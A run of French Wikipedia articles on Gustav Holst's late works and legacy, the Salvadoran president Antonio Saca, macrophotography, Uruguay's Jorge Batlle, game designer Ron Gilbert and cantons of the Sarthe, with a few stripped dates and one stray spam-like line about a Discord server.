Avant son repos forcé en 1924, Holst montre un intérêt nouveau pour le contrepoint, dans sa "Fugal Overture" en 1922 pour orchestre et dans le néo-classique" Fugal Concerto" en 1923, pour flûte, hautbois et cordes. Dans sa dernière décennie, il compose et arrange abondamment ; en 1925, le "Terzetto" pour flûte, hautbois et alto, écrit en trois clés, est cité par Imogen comme la seule véritable œuvre de musique de chambre de Holst. Matthews écrit que la "Choral Symphony" terminée en, après plusieurs mouvements de grande qualité, a un décevant final décousu. Le pénultième opéra de Holst, "At the Boar's Head" (1924), est basée sur la scène de la taverne d’"Henry IV" de Shakespeare. La musique, qui est largement inspirée de vieilles mélodies anglaises de Cecil Sharp et d'autres, est rapide et a de la verve ; le critique Harvey Grace repousse le manque d'originalité.
"Egdon Heath" (1927) est la première grande œuvre orchestrale de Holst après "les Planètes". Matthews résume la musique comme « insaisissable et imprévisible ; trois éléments principaux : une mélodie errante sans tempo [aux cordes], des cuivres tristes et processionnels et une musique agitée pour cordes et hautbois. » La danse mystérieuse à la fin est, selon Matthews, « le moment le plus étrange dans une œuvre étrange. » Richard Greene dans "Music &amp; Letters" décrit la pièce comme « une danse larghetto au rythme de sicilienne et à la mélodie simple, progressive et balançante, » mais manquant de la puissance des "Planètes" et, par moments, monotone à écouter. La "Moorside Suite" pour ensemble de cuivres rencontre plus de succès ; elle est écrite comme pièce de concours pour le "National Brass Band Festival championships" de 1928.
Après cela Holst tente une dernière fois un opéra, dans une veine joyeuse avec "The Wandering Scholar" (1929–30), sur un livret de Clifford Bax. Imogen parle de la musique « comme Holst dans son meilleur dans un scherzando (ludique) d'esprit. » Vaughan Williams parle des rythmes vifs, folkloriques : « Pensez-vous qu'il y a un peu trop de 6/8 dans l'opéra? » Short observe que le motif d'ouverture fait plusieurs réapparitions sans être identifié à un personnage en particulier, mais impose l'unité musicale de l’œuvre.
Holst compose peu de grandes pièces dans ses dernières années. La courte "Choral Fantasia" en 1930 est écrite pour le "Three Choirs Festival" à Gloucester ; des thèmes types de chorales sont entrecoupées de chœurs avec un support instrumental de cordes, de percussions, de cuivres et d'un orgue. À part la musique de scène pour "The Bells", les dernières compositions de Holst sont de petites pièces ; les huit "Canons" de 1932 sont dédiés à ses élèves, bien que selon Imogen ils présentent un formidable défi pour la plupart des chanteurs professionnels. La "Suite Brook Green" (1932), écrite pour l'orchestre de la "St Paul's School", est un compagnon tardif à la "St Paul's Suite". Le bref "Lyric Movement" pour alto et petit orchestre (1933) est composé pour Lionel Tertis. Calme et contemplative, et nécessitant peu de virtuosité du soliste, la pièce a été lente à gagner en popularité parmi les altistes. Robin Hull, dans "Penguin Music Magazine", loue « la beauté claire — impossible à confondre avec l'art d'un autre compositeur ; » cependant, selon Dickinson, cela reste « une création faible. » La dernière composition de Holst, le scherzo d'un projet de symphonie, contient des caractéristiques musicales des premières œuvres de Holst — « un résumé de tout l'art orchestral de Holst, » selon Short. Dickinson pense que trop peu a été composé pour se faire une idée de ce qu'aurait donné la symphonie.
Enregistrements.
Holst a fait quelques enregistrements, dirigeant ses propres œuvres. Pour Columbia il a enregistré "Beni Mora", "Marching Song" et les "Planètes" avec le "London Symphony Orchestra" (LSO) en 1922. Les limitations des premiers enregistrements empêchaient l’extinction graduelle des chants féminins à la fin de "Neptune" et les cordes les plus basses ont dû être remplacées par un tuba pour obtenir un son grave efficace. Avec un orchestre à cordes anonyme Holst a enregistré la "St Paul's Suite" et "Country Song" en 1925. Le principal rival de Columbia, HMV, a sorti des enregistrements du même répertoire, avec un orchestre non nommé dirigé par Albert Coates. Avec l'arrivée des enregistrements électriques, qui améliorent sensiblement la qualité d'enregistrement, Holst et le LSO réenregistrent les "Planètes" pour Columbia en 1926.
Au début de l'époque des LP, peu d’œuvres Holst étaient disponibles sur disque. Seulement six œuvres sont listées dans l'édition de 1955 de ' : "Les Planètes" (Boult pour HMV et Nixa et Sir Malcolm Sargent pour Decca), la musique de ballet "Perfect Fool", la "St Paul's Suite", et trois courtes pièces chorales. Durant l'époque des LP et des CD stéréos, des nombreux enregistrements des "Planètes" arrivent. Au début du , la plupart des œuvres orchestrales majeures et de nombreuses œuvres chorales mineures de Holst ont été enregistrées sur disque. L'édition de 2008 de ' contient sept pages listant les œuvres de Holst sur CD. Concernant les opéras, "Savitri", "The Wandering Scholar" et "At the Boar's Head" ont été enregistrés.
Héritage.
Warrack souligne que Holst a acquis une compréhension instinctive peut-être plus que n'importe quel compositeur anglais, de l'importance de la chanson folklorique. Il y trouve « un nouveau concept, pas seulement sur la manière dont la mélodie est organisée, mais également concernant les implications pour le développement d'un langage artistique mûr. » Holst n'a pas créé ou dirigé d'école de composition ; néanmoins il a exercé une influence sur des contemporains et des successeurs. Selon Short, Vaughan Williams parlait de Holst comme la « plus grande influence sur ma musique, » bien que Matthews avance que les deux se sont mutuellement influencés à parts égales. Parmi les compositeurs suivant, Michael Tippett est reconnu par Short comme le « successeur le plus significatif de Holst, » à la fois en termes de style de composition et également car Tippett, qui a succédé à Holst au poste de directeur de musique du "Morley College", a maintenu l'esprit de la musique de Holst dans l’école. Concernant une des premières rencontre avec Holst, Tippett écrira plus tard : « Holst semblait regarder directement à l'intérieur de moi, avec une vision spirituelle aiguë. » Kennedy observe « qu'une nouvelle génération d'auditeurs… ont reconnu en Holst la source de la plupart de ce qu'ils admirent dans la musique de Britten et de Tippett. » L'élève de Holst Edmund Rubbra reconnait comment lui et d'autres compositeurs anglais plus jeunes ont adopté l’économie de style de Holst : « Avec quel enthousiasme nous n'avons rogné notre musique jusqu'à l'os. »
Short cite d'autres compositeurs anglais influencés par Holst, en particulier William Walton et Benjamin Britten, et suggère que l'influence de Holst a été ressentie plus loin. Il observe que « la montée des quartes de Jupiter peut être entendue dans "Appalachian Spring" de Copland, et que les premières œuvres de Prokofiev et de Chostakovitch portent de semblables traces. LHymn of Jesus" peut être considéré comme un précurseur de la "Symphonie de Psaumes" de Stravinsky. » Cependant, par-dessus tout, Short considère Holst comme un compositeur pour les personnes, qui pensait que c'était le devoir du compositeur de fournir de la musique à des fins pratiques, pour des festivals, des célébrations, des cérémonies, des chants de noël ou des simples airs d'hymnes. Ainsi, Short explique, « de nombreuses personnes qui n'ont peut-être jamais entendues les œuvres majeures [de Holst]… ont néanmoins tiré grand plaisir à entendre ou à chanter ces petits chefs-d'œuvre comme le chant de Noël de '. »
Hommages.
Le , après un week-end de concerts à la cathédrale de Chichester en mémoire de Holst, un nouveau monument est dévoilé pour marquer le soixante-quinzième anniversaire de la mort du compositeur. Y est gravé le texte de "The Hymn of Jesus" : « The heavenly spheres make music for us. »
En un documentaire télévisé de la "BBC", "Holst: In the Bleak Midwinter", parle de la vie de Holst avec une référence particulière à son soutien pour le socialisme et la cause des travailleurs.
En astronomie, sont nommés en son honneur (3590) Holst, un astéroïde de la ceinture principale d'astéroïdes, et Holst, un cratère de la planète Mercure.
Son œuvre a été une source d'inspiration pour beaucoup de compositeurs modernes, notamment Hans Zimmer qui s'est beaucoup inspiré de "Mars, Bringer of war" pour la bande originale de Gladiator, en particulier les titres "The battle" et "Barbarian horde" où, dans ce dernier la rythmique des cuivres est presque similaire. John Williams s'est inspiré de "Venus, bringer of peace" pour le titre "Princess Leia's Theme" (Star Wars).
Liens externes.
le meilleur serveur Discord.
Biographie

</doc>
<doc id="191815" url="https://fr.wikipedia.org/wiki?curid=191815" title="Orbe">
Orbe

 

</doc>
<doc id="191817" url="https://fr.wikipedia.org/wiki?curid=191817" title="Leonel Fernandez">
Leonel Fernandez



</doc>
<doc id="191821" url="https://fr.wikipedia.org/wiki?curid=191821" title="Antonio Saca">
Antonio Saca

Elías Antonio Saca González, parfois surnommé « Tony », né le , est un homme d'État, homme d'affaires et journaliste salvadorien. Il est président de la république du Salvador de 2004 à 2009. Il est condamné à 10 ans de prison en 2018 pour des faits de corruption.
Biographie.
Issu d'une famille d'origine palestinienne installée au Salvador au début du , Saca travaille dans le domaine de la communication, comme commentateur sportif puis créateur d'une radio. Saca appartient, tout comme ses prédécesseurs Alfredo Cristiani, Armando Calderón et Francisco Flores, au parti conservateur ARENA (Alliance républicaine nationaliste).
Lors de la campagne présidentielle de 2004, le manque d'expérience politique de Saca est critiqué par les commentateurs politiques. Le gouvernement de George Bush intervient directement en sa faveur, menaçant d’empêcher l'envoi d'argent des immigrés salvadoriens (source de revenus représentant alors 17 % du PIB du pays) en cas de défaite d'Antonio Saca Au second tour, le , Saca est élu facilement devant le candidat du Front Farabundo Martí de libération nationale (FMLN), Schafik Handal, avec 58 % des suffrages et une participation de 70 %. Le suivant, il prend ses fonctions en remplacement de Francisco Flores. 
Saca suit la même politique que son prédécesseur : économie libérale et alignement politique sur les États-Unis. L'administration des États-Unis du président George W. Bush soutenait la candidature de Saca et les deux pays ont des relations très amicales. Au terme de son mandat de cinq ans, il transmet le pouvoir à son successeur Mauricio Funes le .
Il est candidat à l'élection présidentielle de 2014 pour la Grande alliance pour l'unité nationale mais arrive en troisième position avec 11,4 % des suffrages.
Condamnations pour corruption.
Le , il est arrêté pour corruption et détournement de fonds publics. Plusieurs autres responsables de son administration sont également arrêtés, dont les ex-ministres de la Communication et de la Jeunesse, accusés d'association de malfaiteurs et de blanchiment d'argent, pour le détournement d'au moins 301 millions de dollars vers des comptes privés. Il est condamné à 10 ans de prison en .
Dans une autre affaire, il est condamné en 2021, avec deux autres prévenus, à payer 10 millions de dollars pour le détournement d'une somme identique donnée par Taïwan. Ces fonds avaient été versés au Salvador entre octobre 2003 et avril 2004 pour la mise en œuvre de projets d'aide aux victimes du tremblement de terre de 2001. L'ancien président Francisco Flores s'était approprié 5 millions de dollars et le reste avait été détourné vers les comptes du parti Arena pour la campagne présidentielle de Saca, tandis que les victimes n'avaient rien reçu.

</doc>
<doc id="191822" url="https://fr.wikipedia.org/wiki?curid=191822" title="Macrophotographie">
Macrophotographie

La macrophotographie est le terme usuel désignant la "photomacrographie", souvent abrégé en macrophoto ou macro, du grec ancien , « long, grand ». Il correspond à l'ensemble des techniques photographiques permettant de photographier des sujets de petite taille entre les rapports de grandissement γ = 1 (ou 1:1) et γ = 10 (ou 10:1). Son domaine se situe donc au-delà de celui de la proxiphotographie (γ &lt; 1), mais en deçà de celui de la photomicrographie (γ &gt; 10). Il existe deux acceptions de ce terme, liées à l’ambiguïté que représente la notion d'image sous-jacente à celle de grandissement. 
Acception scientifique et technique.
Revendiquée mais pas systématiquement utilisée par le milieu de la technique photographique, elle s'attache à la définition rigoureuse de grandissement selon l'optique géométrique. Ainsi par « image » on entend celle formée sur le capteur de l'appareil photo. Une macrophotographie est alors une photo dont la taille du sujet sur le capteur est plus grande que sa taille réelle. Cette acception possède des avantages, entre autres parce que certains paramètres concernant la prise de vue, comme la profondeur de champ ou la luminosité, dépendent de cette définition rigoureuse de la notion de grandissement; de plus, elle n'est pas dépendante du format du capteur ou du tirage, ce dernier pouvant facilement varier à partir d'un unique original argentique ou numérique.
Acception historique et commerciale.
Correspondant également à un usage courant en photographie, elle entend par « image » l'image réellement observée. La macrophotographie est donc alors le domaine de la photographie où la taille du sujet sur tirage sur papier, un écran d'ordinateur ou autre, est plus grande que sa taille réelle. Au début de l'argentique, les deux acceptions se rejoignaient car la surface sensible constituait le support du tirage, ou le tirage était réalisé par contact : la taille sur le capteur était la même que celle sur l'épreuve finale observée.
Mais ensuite, pour réaliser le même tirage, la taille du capteur a diminué, l'image finale étant obtenue après agrandissement. Ainsi, les objectifs 24x36 atteignant un grandissement optique de seulement 1:2 (x0,5) ont continué d'être qualifiés de « macro » par leurs constructeurs car ils permettaient encore d'obtenir un grandissement supérieur à 1:1 sur le tirage. Les accessoires destinés à ces prises de vue (bonnettes, bagues-allonges, soufflets, bancs, flash dédiés…) ont également continué d'être qualifiés de macro.
La divergence s'est encore amplifiée avec l'arrivée de très petits capteurs numériques, les constructeurs qualifiant de « macro » des objectifs d'appareil photo compact utilisant des grandissements optiques inférieurs à 1:10 (x0,1), donc pas même du domaine de la proxiphotographie du point de vue de l'optique géométrique.
À noter que cette acception possède l'avantage linguistique de faire référence au terme « macroscopique », désignant ce qui peut être visible à l’œil nu. Enfin, c'est aussi celle privilégiée par le Centre National de Ressources Textuelles et Lexicales, organisme du CNRS.
Principes optiques.
En se rapprochant d'un sujet pour le photographier en gros plan, il faut augmenter la distance entre le film (la pellicule photo/capteur numérique) et l'objectif, afin de conserver le sujet net. La distance ainsi allongée s'appelle le tirage. La plupart des objectifs non spécialisés ont un tirage maximal qui ne permet pas de s'approcher d'un sujet à moins de leur distance focale environ. Il est donc en général impossible de faire des photographies en gros plan sans utiliser des accessoires ou un objectif spécial.
Pour augmenter le grandissement de l'image, divers accessoires permettent d'augmenter le tirage des objectifs standards ou de diminuer la distance focale. On peut encore, par l'usage d'un multiplicateur de focale, multiplier la focale sans changer la distance de mise au point minimale, d'où une prise de vue en un peu plus gros plan.
Accessoires mécaniques.
Ces dispositifs se font sans utilisation de lentille(s). 
Accessoires optiques.
Aucun objectif zoom n'est réellement macro à ce jour, en revanche la plupart des objectifs macro actuels permettant d'atteindre directement le rapport 1:1 ont une distance focale qui diminue sensiblement au fur et à mesure que le grandissement augmente ; ce sont donc bel et bien des objectifs à focale variable, mais présentés comme s'ils possédaient une focale fixe. Ce n'était que rarement le cas des optiques plus anciennes.
Considérations techniques.
Profondeur de champ.
Le contrôle de la profondeur de champ est un point délicat en macrophotographie. Plus le grandissement est important, c'est-à-dire plus le tirage est important avec un objectif donné, plus la profondeur de champ diminue. Au rapport 1:1 et au-dessus, l'intervalle de netteté varie rapidement de quelques centimètres à quelques millimètres. Il est donc difficile d'obtenir d'un sujet relativement important en taille qui soit entièrement net à partir d'un certain seuil de grandissement. Il faut contrôler régulièrement à l'œil la netteté du sujet, ce qui est difficile si ce dernier est mobile (un insecte ou une fleur ballottée par le vent, par exemple).
Pour augmenter la profondeur de champ, il faut fermer le diaphragme. Cela diminuant la luminosité, l'emploi de flashs, réflecteurs et fonds colorés (naturels ou artificiels) est courant en macrophotographie.
Une autre technique permettant d'augmenter la profondeur de champ pour les sujets statiques est la zédification ou focus stacking.
Éclairage.
En studio, la macrophotographie peut s'effectuer sur un banc de reproduction équipé de lampes du type lumière du jour ou de lampes flash.
En extérieur, on peut utiliser plusieurs types de flash électronique :
Peuvent se superposer à cet éclairage spécifique, des solutions palliatives plus ou moins efficaces :
Proxiphotographie.
En général, il est impossible d'atteindre cette taille avec les zooms dits « macro » ou avec la position « macro » de la plupart des appareils photo numériques compact et bridge dont les capteurs sont minuscules. Le plus souvent, les clichés obtenus avec ces appareils relèvent de la proxiphotographie.

</doc>
<doc id="191826" url="https://fr.wikipedia.org/wiki?curid=191826" title="Jorge Batlle">
Jorge Batlle

Jorge Batlle Ibáñez (né le à Montevideo et mort le dans la même ville) est un homme d'État uruguayen, membre de l'aile libérale du Parti colorado. Il est le président de la République de 2000 à 2005, remplacé par Tabaré Vázquez (PS-Front large) le .
Biographie.
Années 1960-70.
Fils de Luis Batlle Berres, président de la République de 1947 à 1951 et leader de la liste 15 du Parti colorado, et de Matilde Ibáñez Tálice, il devient à son tour dirigeant de la liste 15 à la mort de son père en 1964. Il soutient alors les mesures autoritaires ainsi que le contrôle des prix et des salaires instauré par le président "colorado" Jorge Pacheco Areco.
Aux élections générales de 1971, il est candidat à la présidence du Parti colorado, avec comme colistier Renán Rodríguez. Il obtient 14,59 % du total des voix, soit 35,62 % au sein du Parti colorado, perdant face à son rival "colorado" Juan María Bordaberry, dauphin de Pacheco Areco, qui demeure à la tête de l'État après le coup d'Etat de juin 1973.
Gouvernement Batlle.
Au premier tour de l'élection présidentielle de 1999, Batlle obtient 32,59 % des voix, contre 39,87 % pour Tabaré Vázquez, le candidat du Front large (coalition de gauche). N'ayant donc gagné, au second tour, contre Vázquez qu'avec l'appui des voix du Parti blanco, Batlle intégra plusieurs personnalités "blancas" dans son gouvernement, menacé par une situation de cohabitation en raison de la majorité simple du Front large au Parlement. Il inclut ainsi Álvaro Alonso au Travail, Sergio Abreu à l'Industrie (remplacé en 2002 par le "colorado" Pedro Bordaberry, fils de l'ex-dictateur). Les autres (Guillermo Stirling à l'Intérieur, Luis Brezzo puis Yamandú Fau à la Défense, Alberto Bensión puis Alejandro Atchugarry à l'Économie) étaient "colorados".
Sur le plan économique, Batlle a engagé des négociations avec les États-Unis concernant la création de la « Zone de libre-échange des Amériques » (ZLEA). La période a marqué le point culminant d'un processus qui visait à une réorientation néolibérale de l’économie du pays : désindustrialisation, pression sur les salaires, essor du travail informel, etc. Son gouvernement suspend en outre la convocation des conseils de salaires dans la plupart des secteurs d'activités pour limiter l'influence des syndicats désormais contraints de négocier entreprise par entreprise. Ces syndicats restent toutefois suffisamment puissants pour le pousser à reculer dans ses projets de privatisation de l'eau et de réduction des moyens accordés au système de santé public. La situation sociale se détériore considérablement sous sa présidence et près du tiers de la population plonge dans la pauvreté entre 1999 et 2005.
Au niveau des droits de l'homme, il appuie, en tant que concession faite au Front large qui a remporté le premier tour des élections de 1999, la création d'une Commission pour la paix, chargée d'examiner les violations des droits de l'homme commises par les militaires durant la dictature. En 2015, Pedro Barneix, qu'il a placé à la direction des services secrets entre 2000 et 2005, se tire une balle dans la tête peu avant son arrestation pour avoir fait torturer à mort un opposant sous la dictature.

</doc>
<doc id="191829" url="https://fr.wikipedia.org/wiki?curid=191829" title="Ron Gilbert">
Ron Gilbert

Ron Gilbert est un concepteur de jeux vidéo américain, né en à La Grande (Oregon).
Ron Gilbert est surtout connu pour son travail chez Lucasfilm Games sur les jeux "Maniac Mansion", "The Secret of Monkey Island" et "".
Biographie.
Début de carrière.
Ron Gilbert grandit dans une petite ville de l'Oregon. Son père était professeur de physique. Au lycée, il passe la plupart de son temps libre à développer ses talents de programmeur.
Cependant, il pensait se diriger vers une carrière de réalisateur de films.
Ce qui l'a motivé à créer des jeux, c'est sa fascination pour les technologies liées à la programmation qui permettent aux joueurs d'interagir avec des personnages et des situations ainsi que son amour pour les histoires, comme celle de "Star Wars".
Sa passion pour Star Wars et son intérêt à raconter des histoires étaient si importants que Ron Gilbert et son ami Tom McFarlane ont réalisé quelques films avec une caméra Super-8. Le premier film qu'ils ont tourné en 1978 s'intitule "Stars Blasters" ; il est réalisé par Ron Gilbert et interprété par les amis McFarlane et Frank Lang. En 1979, ils tournent un autre film, "Tomorrow Never Came", interprété par Ron Gilbert, Tom McFarlane ; il est également réalisé par Ron Gilbert.
En 1979, Ron Gilbert s'exerce en autodidacte à la programmation de jeux sur le nouvel ordinateur personnel acheté par ses parents: le NorthStar Horizon (ordinateur fonctionnant sous CP/M ou NorthStar DOS avec un microprocesseur Z80 à 4MHZ et 16 kilo-octets de RAM). Sa méthode consistait à étudier et analyser les jeux pendant des heures. Tout d'abord, il mémorisait chaque image de la disposition de jeux comme Donkey Kong, Pac-Man, Asteroids, Space Invaders ou . Ensuite, il notait tout détail et tentait enfin de les reproduire sur son propre ordinateur. Une fois la copie réalisée, il exerçait sa créativité en y ajoutant des modifications personnelles. Il appliquait aussi cette méthode sur les publicités des jeux Atari 2600 aperçus dans des magazines spécialisés. Une fois les jeux terminés, il proposait à ses amis de les tester et évaluait ce qu'ils avaient apprécié ou non.
LucasArts.
Ron Gilbert commence sa carrière professionnelle en 1983, alors qu'il est toujours étudiant, en écrivant avec Tom McFarlane un programme appelé Graphics Basic. Ils vendent leur programme à une compagnie de San Francisco nommé HESware. Impressionné par son travail, HESware offre un travail à Gilbert. Il y passe la moitié d'une année, programmant des jeux de plates-formes pour Commodore 64. Toutefois, aucun d'entre eux ne sort car la compagnie cesse de travailler dans ce domaine.
Peu de temps après, Ron Gilbert rejoint Lucasfilm Games (qui devient plus tard LucasArts). Il travaille dans un premier temps sur des portages pour Commodore 64 de jeux Atari 800.
En 1985, il a l'occasion de développer son propre jeu pour Lucasfilm Games, dont l'action se déroule dans un sombre manoir de l'ère victorienne habité par un savant fou, sa progéniture légèrement attardée et un étrange alien. Ron Gilbert et un graphiste de Lucasfilm, Garry Winnick, ont eu cette idée ensemble après de nombreuses discussions et ont vu le moment pour eux d'en faire un jeu : "Maniac Mansion".
Ron Gilbert programme le système d'écriture par scripts SCUMM (nommé d'après le projet pour lequel il a été écrit : le Script Creation Utility For "Maniac Mansion)" et l'interface "point and click".
"Maniac Mansion" sort en 1986 et obtient un succès inattendu. SCUMM apparaît alors comme le moteur idéal pour les jeux d'aventure. Ron Gilbert crée ensuite avec son moteur de jeu de nombreux jeux d'aventure à succès pour Lucasfilm Games, dont les classiques "The Secret of Monkey Island" et "". Ron Gilbert n'a travaillé que sur les deux premiers jeux de la série "Monkey Island", les épisodes 3, 4 et 5 ayant été faits sans lui ("The Curse of Monkey Island", "Escape from Monkey Island" et "Tales of Monkey Island").
En 1992, il quitte LucasArts pour fonder Humongous Entertainment avec Shelley Day. La plupart des jeux développés ont été construits sur une version dérivée du moteur S.C.U.M.M. Ron Gilbert y est responsable des projets suivants : "Pouce-Pouce", "Marine Malice", Fatty Bear,"" et la série des "Backyard Sports".
L'après LucasArts.
En 1995, Gilbert fonde Cavedog Entertainment, la société sœur et complémentaire de Humongous pour développer des jeux ciblant les adultes.
En 1996, GameSpot l'a nommé 15e sur sa liste des personnes les plus influentes de tous les temps dans le domaine des jeux vidéo.
Pendant qu'il était producteur à Cavedog, Gilbert a travaillé sur "Total Annihilation" ainsi que sur Good &amp; Evil. Largement considéré comme son projet phare, Good &amp; Evil devait intégrer de nombreux thèmes et styles de jeu différents. Ce jeu a été présenté en avant-première par plusieurs publications mais le projet a été annulé lorsque Cavedog a fermé ses portes en 1999. Dans une interview accordée à GameSpot peu après la fermeture de Cavedog, Gilbert explique que le projet Good &amp; Evil avait souffert du fait qu'il essayait de concevoir un jeu tout en dirigeant une société en même temps.
En 2005, Ron Gilbert travaillait seul sur une nouvelle aventure avec des éléments de jeux de rôle dont le nom est inconnu et qu'il proposait à des éditeurs. Il est également l'auteur du blog "Grumpy Gamer". Il y commente l'industrie du jeu généralement sous la forme de dessins animés qu'il a créés avec le designer de Voodoo Vince, Clayton Kauzlaric.
En 2007, Gilbert a créé "Threepwood", une guilde exclusivement sur le thème de Monkey Island sur le serveur Quel'Dorei de World of Warcraft.
La même année, il soutient le studio Hothead Games sur un jeu webcomic Penny Arcade Adventures : On the Rain-Slick Precipice of Darkness. Grâce à cette collaboration, il est choisi pour être l'orateur principal de la Penny Arcade Expo 2009.
En janvier 2008, Gilbert se joint à l'équipe de Hothead Games en tant que directeur créatif. Il participe activement au développement du jeu DeathSpank, un jeu d'aventure et de rôle. Durant la même période, Gilbert travaille aussi pour Telltale Game où il contribue à la conception de Tales of Monkey Island. Il est particulièrement actif lors du processus de brainstorming au début du développement du jeu. C'est un retour aux sources pour le développeur : ce cinquième épisode de la série Monkey Island a marqué le retour de Gilbert sur la série des jeux Monkey Island. Sa dernière participation était en 1991 et concernait .
Le 6 avril 2010, sur son blog, il a annoncé qu'il se séparait de Hothead Games. Il poursuivra son travail sur DeathSpank en collaboration avec Electronic Arts.
En septembre 2010, on apprend que Gilbert avait été embauché par son collègue Tim Schafer, ex-concepteur de jeux LucasArts, pour travailler chez Double Fine Productions, la société de Schafer. En février 2012, Tim Schafer a confirmé qu'il allait travailler avec Ron Gilbert sur un nouveau jeu d'aventure. En mai 2012, le nom du jeu est révélé : The Cave qui a été publié par Sega en 2013.
En 2012, The Walt Disney Company rachète LucasArts. Les droits de la série Monkey Island sont devenus la propriété de la société. Ron Gilbert est mitigé : en novembre 2012, il dit ne pas être optimiste quant à l'avenir de la franchise pensant qu'elle pourrait être abandonnée au profit de Pirates des Caraïbes. Cependant, en décembre 2012, il exprime le souhait de prendre contact avec Disney avec l'espoir qu'il pourra " faire le jeu qu'il veut faire ".
En mars 2013, Gilbert quitte Double Fine Productions. Il reconnaît avoir intégré le studio pour uniquement participer à la création de The Cave à la suite d'une invitation de Tim Schafer. Par la suite, il a participé au développement du jeu Scurvy Scallywags sur iOS et Android avec le co-créateur de DeathSpank, Clayton Kauzlaric.
Le 18 novembre 2014, Gilbert retrouve Gary Winnick avec qui il avait créé ses premiers jeux point-and-click acclamés par la critique chez LucasArts. Il est annoncé qu'ils collaborent ensemble sur le développement du point-and-click intitulé Thimbleweed Park. Le jeu a atteint son objectif de financement sur la plate-forme de financement participatif Kickstarter le 18 décembre. Le jeu est sorti le 30 mars 2017, en mode "talkie" complet pour Windows, Linux, Mac et Xbox One. Etant donné que le projet a atteint son dernier échelon dans le financement, un portage sur iOS et Android a été confirmé.
Le 23 mai 2016, sur le réseau social Twitter, Gilbert explique qu'il souhaite racheter les anciennes franchises de LucasArts en disant : " S'il vous plaît, vendez-moi ma propriété intellectuelle de Monkey Island et Maniac Mansion. Je paierai de l'argent réel pour eux ". En 2017, les fans de la série ont lancé une pétition en ligne en soutien au développeur, demandant à Disney de lui vendre les franchises. En décembre 2021, la pétition a recueilli environ 29 000 signatures.
Le 15 mars 2018, Gilbert déclare qu'il entame le développement d'un RPG appelé "A Little Something".
Le 4 avril 2022, Gilbert annonce sur Twitter qu'il travaille, dans le plus grand secret, sur "Return to Monkey Island" depuis deux ans.

</doc>
<doc id="191833" url="https://fr.wikipedia.org/wiki?curid=191833" title="Canton de Vibraye">
Canton de Vibraye

Le canton de Vibraye est une ancienne division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
Géographie.
Ce canton est organisé autour de Vibraye dans l'arrondissement de Mamers. Son altitude varie de 71 m (Dollon) à 199 m (Lavaré) pour une altitude moyenne de 117 m.
Histoire.
De 1833 à 1848, les cantons de Bouloire et de Vibraye avaient le même conseiller général. Le nombre de conseillers généraux était limité à 30 par département.
Représentation.
Conseillers généraux de 1833 à 2015.
Le canton participe à l'élection du député de la cinquième circonscription de la Sarthe.
Conseillers d'arrondissement (de 1833 à 1940).
Le canton de Vibraye appartenait à l'arrondissement de Saint-Calais jusqu'à sa disparition en 1926.
Composition.
Le canton de Vibraye comptait en 2012 (population municipale) et regroupait six communes :
À la suite du redécoupage des cantons pour 2015, toutes les communes sont rattachées au canton de Saint-Calais.
Contrairement à beaucoup d'autres cantons, le canton de Vibraye n'incluait aucune commune supprimée depuis la création des communes sous la Révolution.

</doc>
<doc id="191834" url="https://fr.wikipedia.org/wiki?curid=191834" title="Canton de la Suze-sur-Sarthe">
Canton de la Suze-sur-Sarthe

Le canton de la Suze-sur-Sarthe est une division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
À la suite du redécoupage cantonal de 2014, les limites territoriales du canton sont remaniées. Le nombre de communes du canton passe de 12 à 15.
Géographie.
Ce canton est organisé autour de La Suze-sur-Sarthe dans l'arrondissement de La Flèche. Son altitude varie de (Chemiré-le-Gaudin) à (Souligné-Flacé) pour une altitude moyenne de .
Histoire.
Par décret du , le nombre de cantons du département est divisé par deux, avec mise en application aux élections départementales de mars 2015. Le canton de la Suze-sur-Sarthe est conservé et s'agrandit. Il passe de 12 à 15 communes.
Représentation.
Conseillers d'arrondissement (de 1833 à 1940).
Le canton de La Suze appartenait à l'arrondissement du Mans jusqu'en 2006.
Conseillers généraux de 1833 à 2015.
Albert Fouet a été nommé conseiller général honoraire du canton par arrêté préfectoral du .
Le canton participe à l'élection du député de la quatrième circonscription de la Sarthe.
Résultats détaillés.
Élections de mars 2015.
À l'issue du des élections départementales de 2015, deux binômes sont en ballottage : Delphine Delahaye et Emmanuel Franco (Union de la Droite, 31,84 %) et Virginie Blanchet et Joël Cormier (FN, 30,15 %). Le taux de participation est de 50,39 % ( sur ) contre 49,74 % au niveau départemental et 50,17 % au niveau national.
Au second tour, Delphine Delahaye et Emmanuel Franco (Union de la Droite) sont élus avec 63,86 % des suffrages exprimés et un taux de participation de 51,73 % ( pour et ).
Élections de juin 2021.
Le premier tour des élections départementales de 2021 est marqué par un très faible taux de participation (33,26 % au niveau national). Dans le canton de la Suze-sur-Sarthe, ce taux de participation est de 29,44 % ( sur ) contre 29,78 % au niveau départemental. À l'issue de ce premier tour, deux binômes sont en ballottage : Delphine Delahaye et Emmanuel Franco (Union à droite, 37,96 %) et Joëlle Brunet et Luc Marie Faburel (Union à gauche avec des écologistes, 24,48 %).
Le second tour des élections est marqué une nouvelle fois par une abstention massive équivalente au premier tour. Les taux de participation sont de 34,36 % au niveau national, 30,67 % dans le département et 29,65 % dans le canton de la Suze-sur-Sarthe. Delphine Delahaye et Emmanuel Franco (Union à droite) sont élus avec 61,95 % des suffrages exprimés ( pour et ).
Composition.
Composition avant 2015.
Le canton de La Suze-sur-Sarthe regroupait douze communes.
À la suite du redécoupage des cantons pour 2015, toutes les communes sont à nouveau rattachées au canton de la Suze-sur-Sarthe auquel s'ajoutent trois communes du canton de Malicorne-sur-Sarthe.
Anciennes communes et changements de territoires.
Les anciennes communes suivantes étaient incluses dans le canton de la Suze-sur-Sarthe :
En 1853, Spay cède une partie de son territoire pour la création de la commune d'Arnage (canton du Mans-Sud-Ouest). En 1880, la commune de Guécélard est créée par prélèvement du territoire de Fillé.
Composition depuis 2015.
Le canton regroupe désormais quinze communes entières.

</doc>
<doc id="191835" url="https://fr.wikipedia.org/wiki?curid=191835" title="Canton de Saint-Calais">
Canton de Saint-Calais

Le canton de Saint-Calais est une division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
À la suite du redécoupage cantonal de 2014, les limites territoriales du canton sont remaniées. Le nombre de communes du canton passe de 14 à 37.
Géographie.
Ce canton est organisé autour de Saint-Calais dans l'arrondissement de Mamers. Son altitude varie de 64 m (Bessé-sur-Braye) à 182 m (Montaillé) pour une altitude moyenne de 123 m.
Représentation.
Conseillers d'arrondissement (de 1833 à 1940).
Le canton de Saint-Calais avait deux conseillers d'arrondissement.
Il appartenait à l'arrondissement de Saint-Calais jusqu'à sa disparition en 1926.
